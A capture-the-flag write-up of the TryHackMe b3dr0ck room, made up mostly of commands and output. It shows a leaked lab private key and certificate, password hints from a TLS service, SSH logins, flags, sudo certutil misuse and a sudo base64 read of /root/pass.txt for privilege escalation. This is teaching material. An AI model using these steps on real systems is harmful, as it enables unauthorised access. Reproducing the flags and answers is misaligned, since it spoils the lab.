## Ib3dr0ck

#### Server trouble in Bedrock.

---

**Nmap**

```

# Nmap 7.60 scan initiated Sat Sep 24 07:18:28 2022 as: nmap -sC -sV -oN nmap2.txt 10.10.155.34
Nmap scan report for ip-10-10-155-34.eu-west-1.compute.internal (10.10.155.34)
Host is up (0.025s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ip-10-10-155-34.eu-west-1.compute.internal:4040/
9009/tcp open  domain  ISC BIND What are you looking
MAC Address: 02:4A:77:D2:3C:65 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 24 07:19:40 2022 -- 1 IP address (1 host up) scanned in 71.49 seconds

```

We can retrive Private Key and Certificate using 9009 Port.

`sudo nc -v MACHINE_IP 9009`

```

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA0F3AGcis2ZllOijpFGeGgyW7sfWK1v00ZPPjH6p9/rfojqHY
dsQ+vSR+QknDPnZqCRleZd+W43lBZek6mLqxg/dFUmVowdYSzIBlF8kIDmBfXeDs
WVzk3IDuPaDm/lMUshr4GykCmO9eStM9pFnoZ14kFes89M5gGJ1171kjx4eLQt2r
lIgAI5qhVjWPnYIXuCPNx1NnkvizvLqtJ6ektJdLvkzK3lh04punfHIKJlpbCwx0
fqTzK18I7gYHFT9o/v6FAtvJYeSJOu4UiEX2nUMOoA6SK9xOjN0vUAL1rwgOxqL6
k6twmt/SiJs1UOB428saj/IgFxSzQ3g+eOJkpQIDAQABAoIBAEIjH9CPU94VxH27
cpAZdCa4mWUZLSKkaDcK+rKYaTmqolRzpsO78rYSmUjtJN30tB+DP+VSHRDC8jEo
4IKN776VhBltOt0b2Ae1UWFFXBtEF8EynZKX28Tp37UMF4XuVQlbahkk4UAt6l4R
wuUh7JSy2v1iF40U3IezozV/s82m87pxYgmb5ES9ivmLi2x0V9OK+okbZCGjN5Z9
XGTaDLhlbD7krjKPtYXQK+opy8AWqaAnLaozjbIut/hgxDEL2MBu543AIUkfCSdw
l4IOv7KpEqDqIj7PCaBJLDhbs/QMVCbSQRy+0UuefZ7WiOFXAFbYEiTKR0DN28BO
GP0MDBkCgYEA6Yt6uh36hORv+aSnIzzw8/o87Sictv1+SLd99sFh53a1nH33gPsA
a3deddr9x7JS4t8NZjuaUMJxrhvE1lLjyU38WcDjVZ1MMkbxZyVP6PDfzY4MV483
zGVaqSdTTf5fW5EgzgQ+t5LbGU1ieqSNg4f9kAhIWPSqbmL93OUWHIsCgYEA5GaE
4O+AfL2IPLyTmtJt/SAZD/lwKIKujtYEiOMtkxL6tUcQ047ZOr/QKVtJNmTvsl8h
3Fq0Sw+/xQNS7e/qh4rpaI+Hr+5u6Z2/ApBxXh2yUefi7njjgyv6xuvq5Q2rCSsK
/6dfwE+4A57BNjtmpxWgF+WB53y7MJf+nGm4uY8CgYAbahkM8envYZVXW6GW/FdY
fF5chHDo9ha12Hw70/V3IzMsXIkKJeylsMxwzzUNFPyvzvkWsBZsNnb7thzD/9Tn
U3U03/SPnzhLipJZxkJ8GJJc4bjHKnOlVZxv0MLxm9N7vyx3on3uNJntfWz68of+
EZ+NIbvEXWwIKyybmnSfAwKBgCW5zU7+IGH6SGuH1nWnNmWuDJW35M+8LisHrL4T
kC6P3vtcXqojGTx7/F0oZ+JlL7ZtwkEMdmVDl7BqCSOmEj4LMtyDgK0NnCJYXPmG
dENQcmjW/YPYUfQTqpt60lS9OjgMdQefVNCGGmX2rgFQNHd6ufPYg+mBj8XKBVM+
nzV/AoGAL7muxj9OaBnj6yikuM39T7mhhys645fGaJ0iWVUrSy5hp5diSj5h7ELG
BZxEzN5zt3icTIKcgc2K6CAjofbjQQhbbZmiyd5LoquhyXGnveZ16+BFyIaj5lGv
Dc+k+40mJ5vMVOzww/wp14VkW0FLsHNQ6rRbgXMpMDUO4GbvAcY=
-----END RSA PRIVATE KEY-----

```

```

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjA5MjUwNzI1NTNaFw0yMzA5MjUwNzI1NTNaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDQXcAZ
yKzZmWU6KOkUZ4aDJbux9YrW/TRk8+Mfqn3+t+iOodh2xD69JH5CScM+dmoJGV5l
35bjeUFl6TqYurGD90VSZWjB1hLMgGUXyQgOYF9d4OxZXOTcgO49oOb+UxSyGvgb
KQKY715K0z2kWehnXiQV6zz0zmAYnXXvWSPHh4tC3auUiAAjmqFWNY+dghe4I83H
U2eS+LO8uq0np6S0l0u+TMreWHTim6d8cgomWlsLDHR+pPMrXwjuBgcVP2j+/oUC
28lh5Ik67hSIRfadQw6gDpIr3E6M3S9QAvWvCA7GovqTq3Ca39KImzVQ4HjbyxqP
8iAXFLNDeD544mSlAgMBAAEwDQYJKoZIhvcNAQELBQADggEBALooBQ4dX1fivwGE
QHIBXpw1UeTQwEdRT3KXRKF6xxwxS2zNhNjqfJiCoPjDwq+RaAIHVX2AYjopc5pY
8sGP9AOjPl5c5Qk5JtGi/kHT3YBAvK9rGXHTZjpj+3RFfnJKzKXp+aOWSYp3yqQ7
8uuy3m6Dzpc/Eu6w5xk2+C/PG5xOD/rGHLprqdAUMjyu4T4msKThV37iKBCIDD5Z
hvAdlHxIk20SH1Dy3SYn8U7+jGdg+iWctRkMIir7Vu3IqHV3k6sk2jkFU5HH01OW
EcV6kMlP56ZSOZZtvibxg3EUzyRlaH0aaoqXyK9AJZ6RDY/aBwd83kh9+KpJEZO3
CV2C9fQ=
-----END CERTIFICATE-----

```

Lets Connect SSH With Barney Rubble Key and Certificate.

```

root@ip-10-10-121-11:~# nc -v 10.10.90.203 9009
Connection to 10.10.90.203 9009 port [tcp/*] succeeded!


root@ip-10-10-121-11:~/Desktop# socat stdio ssl:10.10.90.203:54321,cert=cert,key=key,verify=0


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'Barney Rubble' is authorized.
b3dr0ck> ls
Unrecognized command: 'ls'

This service is for login and password hints
b3dr0ck> login
Login is disabled. Please use SSH instead.
b3dr0ck> password
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
b3dr0ck> 

barney@b3dr0ck:~$ ls
barney.txt
barney@b3dr0ck:~$ cat barney.txt 
THM{f05780f08f0eb1de65023069d0e4c90c}
barney@b3dr0ck:~$ 


```

Barney have sudo permission of certutil so we can view fred certificate and key.

```

barney@b3dr0ck:~$ sudo certutil -a fred.csr.pem
Generating credentials for user: a (fredcsrpem)
Generated: clientKey for a: /usr/share/abc/certs/a.clientKey.pem
Generated: certificate for a: /usr/share/abc/certs/a.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEA2N3eU1DkYX6OoSyGvbOJynwaUnPhigo6XpdyYmkFJR5btnf1
IYMfmJSqWZUMnUvdImlva1mTJ7dYmRRahz5NW9GlisibAAj4ebY/JrK9QQE/5wjd
t6ZLRtYDz1+C13/Ce8HdZ46jxP7M0Rcx+38vf4lh4/rVa9xIbw3y83bjh5X/M5Xw
PKnc9riF1YfQ/TL1qwNTdHbgTPY/tCoMTw306kwO/bkmUjTULnvESWqvZqg6gJ1K
WHGlLVxkVK/5QRM3gwFgTkEFZW0k66lM4rMaYH5A8jOpELkZOWBqSwhTq8MqJwSv
aYCOuJqDZhhLvl648X6EnctLJV1au5cc8yUXwQIDAQABAoIBAQCeNp8wIV+8UNw1
cYqLcyQfeRKq/KeaUYPr5okoin2aat9162YGoOa4Jh1xZW/igao+pLUImDznSLd2
VocFC8rcJcKj0V5jVCgSg4bm8JdpiUPZhXpbtRJOB2yYKZIHLcnxB6pDFqkb2tgJ
4uYwGMXKQawM6r4xBnBBtOd9/0pXaxsHO9M4gvE9IArrt7hgsHXIKYWmat6QK3sd
YmSNm+ccNoveGKNpGZfPm7oWv3YQb7zWoMg3fF4WpCNGkk6JpaoazYoLM99zm3k+
d82tJZoZGqt+i1kfmDz9NUpsDGh4+EWYFgrWxJ4/y5PjZXYin+74DJfgLk6/3kmU
YEyKDZ0RAoGBAO3yG68jwpqx7XPydbYMxhcU3hSRPWb1m3jvlMTkyGYZbIatsikM
OKVBhtGPWxYK5ZwOX8qsnaSKRggCLfAuAKZ0sd7i6ZuW0uXD3VgUHphkUmbZzmsL
cd1rGC76Qh8lfQYVbPLGQKdPHvkYJ6eiq4Zir8kR+oaO/ugLZfJ6mifPAoGBAOlS
UVAWaEnJKowuOyPeMdoQa4x2CWiTohQD4mRZitwyGTVnMrGeU2Ordyfe/1FPvEtF
QWGkkIeilTRdW6Zc4Atz6m7jsipOylLkSLX2uEdPDUPTWkHLs5SHklvR1zUo3pip
gco7uMGAWKy6N93Tv5xm3eV6F35Iz8e4xTJh9RtvAoGBANpXBFJExSjARjzT6nGf
7RF3A4Xp9GcKzpw9c8zshnsxryUyM754yW3S4AxhuFpUq3b0ta+7j3hRrYthvJed
DtmvURxOKcCsuF8/yFcvNxftTrOz/za4rMZZpDpPR+detgekF3H6u48LCkfWg2TO
3wgUfGtMBQ/+HSf+dZD4MYZ/AoGBALrckYDJoVZOxUOllvm/7z8M3YWN1zUo36qV
/c+OoxZ9DRFnCAOWoIR3g6OsBeESMeQ6oAVabeIjBMn+ZvNS+KBTgpKyyzL1DTbb
25vX73g0yJPkhimhwb4X4dClu2y4waWUQ/06XVqjtuEG9s0y1Aenntk1MfGS0M3M
nioep9YDAoGBAKUR9XOKeeESdVbQK7ShWqHDaqK6SiMYPWvfXjU+sUK84yqnQAoA
ousXuQA0Z5gvjcqAMGbfZlsoQpcqO7ee8GT/47dT3HGtQPrk9gCU8j6XtnGdusBG
N7ZDqkxSJxg62C9T6JpggtQ3Wyrg+hXiDPzehG6xEC3v5WnlUPNCVBE8
-----END RSA PRIVATE KEY-----

-----BEGIN CERTIFICATE-----
MIICnjCCAYYCAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjA5MjUwODA2MjZaFw0yMjA5MjYwODA2MjZaMBUxEzARBgNVBAMMCmZy
ZWRjc3JwZW0wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDY3d5TUORh
fo6hLIa9s4nKfBpSc+GKCjpel3JiaQUlHlu2d/Uhgx+YlKpZlQydS90iaW9rWZMn
t1iZFFqHPk1b0aWKyJsACPh5tj8msr1BAT/nCN23pktG1gPPX4LXf8J7wd1njqPE
/szRFzH7fy9/iWHj+tVr3EhvDfLzduOHlf8zlfA8qdz2uIXVh9D9MvWrA1N0duBM
9j+0KgxPDfTqTA79uSZSNNQue8RJaq9mqDqAnUpYcaUtXGRUr/lBEzeDAWBOQQVl
bSTrqUzisxpgfkDyM6kQuRk5YGpLCFOrwyonBK9pgI64moNmGEu+XrjxfoSdy0sl
XVq7lxzzJRfBAgMBAAEwDQYJKoZIhvcNAQELBQADggEBADGEQ8qw4JW0CdtN5JhJ
J2s7AL8ru4efl5ngheQF7W5ewMBdXIMpIupNAlHHH0GGGKfN0HvNiGjD4/MLYM87
KmCCUZRMwjSXBdNc6kGGgmf114wCWlel17XNMwIpKSMJRIgE9tX6WudfxhKR629Y
j678soDM3aOwcUubXacrwvKkcgYW8gUFyQnbuiGh0G+bVWMEH91byxOi6ipHO6nM
+eoeyQNNZZ0rWs3HR06+xYZp1XcX8VX/5Hl179W+4T4r+Zxfy2PIM/Ab1ugb0bpW
KpUERICUHHvqtBe63yNcDUGj+LqIzCc7+hdeDktWUV6cwhm3L0O9UYLyD7cV2Wks
M2Y=
-----END CERTIFICATE-----

```

Lets find out password of fred.

```

root@ip-10-10-121-11:~/Desktop# socat stdio ssl:10.10.90.203:54321,cert=cert,key=key,verify=0


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'fredcsrpem' is authorized.
b3dr0ck> ls
Unrecognized command: 'ls'

This service is for login and password hints
b3dr0ck> password
Password hint: YabbaDabbaD0000! (user = 'fredcsrpem')
b3dr0ck> user
Current user = 'fredcsrpem' (valid peer certificate)


```

Lets connect fred with SSH.

```

b3dr0ck> ^Croot@ip-10-10-121-11:~/Desktop# ssh fred@10.10.90.203
fred@10.10.90.203's password: 
fred@b3dr0ck:~$ ls 
fred.txt
fred@b3dr0ck:~$ cat fred.txt 
THM{08da34e619da839b154521da7323559d}

```

Check Sudo Permission of Fred.

```

fred@b3dr0ck:/home$ sudo -l
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
fred@b3dr0ck:/home$ cat /root/pass.txt
cat: /root/pass.txt: Permission denied

```

Fred have sudo permissionon base64 and base32. Go GTFOBINS Website and Check for Priviledge Esclation Technique and find out method.

```

fred@b3dr0ck:/home$ LFILE=/root/pass.txt
fred@b3dr0ck:/home$ sudo base64 "$LFILE" | base64 --decode
LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
fred@b3dr0ck:/home$ 

```

We have got base64 decoded value, lets decode value go to cyberchef and decode that

![Cyberchef](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/b3dr0ck/Picture-1.png)

We have got MD5 password, Lets crack with md5 cracker.

![Cyberchef](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/b3dr0ck/Picture-2.png)



